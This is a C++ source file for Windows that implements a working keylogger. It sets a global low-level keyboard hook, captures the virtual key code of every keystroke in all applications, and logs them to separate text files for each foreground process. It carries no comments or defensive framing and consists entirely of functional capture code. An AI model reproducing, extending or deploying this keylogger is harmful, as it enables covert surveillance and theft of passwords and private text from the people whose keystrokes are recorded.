#include "../includes/includes.hpp"

HHOOK keyboardHook;
std::ofstream outputFile;
std::string currentProcessName;

std::string GetActiveProcessName() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "Unknown";

    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) return "Unknown";

    char processName[MAX_PATH];
    if (GetModuleBaseName(hProcess, NULL, processName, sizeof(processName) / sizeof(char)) > 0) {
        CloseHandle(hProcess);
        return std::string(processName);
    } else {
        CloseHandle(hProcess);
        return "Unknown";
    }
}

void StartNewLogFile(const std::string& processName) {
    if (outputFile.is_open()) {
        outputFile.close();
    }

    std::string fileName = processName + "_keylogs.txt";
    outputFile.open(fileName, std::ios::out | std::ios::app);
    if (!outputFile.is_open()) {
        MessageBox(NULL, "Failed to open log file!", "Error", MB_ICONERROR);
        exit(1);
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string newProcessName = GetActiveProcessName();
            if (newProcessName != currentProcessName) {
                currentProcessName = newProcessName;
                StartNewLogFile(currentProcessName);
            }

            DWORD vkCode = pKeyboard->vkCode;
            outputFile << vkCode << std::endl;
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void SetHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
}

void Unhook() {
    UnhookWindowsHookEx(keyboardHook);
}

int main() {
    currentProcessName = GetActiveProcessName();
    StartNewLogFile(currentProcessName);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    Unhook();
    if (outputFile.is_open()) {
        outputFile.close();
    }
    return 0;
}
